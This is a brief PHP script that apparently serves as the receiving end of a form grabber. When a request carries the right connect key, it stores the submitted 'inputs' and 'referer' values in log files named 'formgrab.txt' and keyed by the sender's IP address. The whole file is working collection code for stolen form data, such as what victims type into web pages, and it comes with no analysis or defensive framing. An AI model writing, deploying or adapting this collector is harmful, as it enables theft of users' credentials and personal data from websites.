<?php
require("config.php");
if(isset($_GET['connect']) && $_GET['connect'] == $connectKey && isset($_GET['inputs']) && isset($_GET['referer'])) {
    $inputs=$_GET['inputs'];
    $referer=$_GET['referer'];
    $logfile="./logs/".$_SERVER['REMOTE_ADDR']." - formgrab.txt";
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, $inputs."\r\n^--- FROM ".$referer."\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>
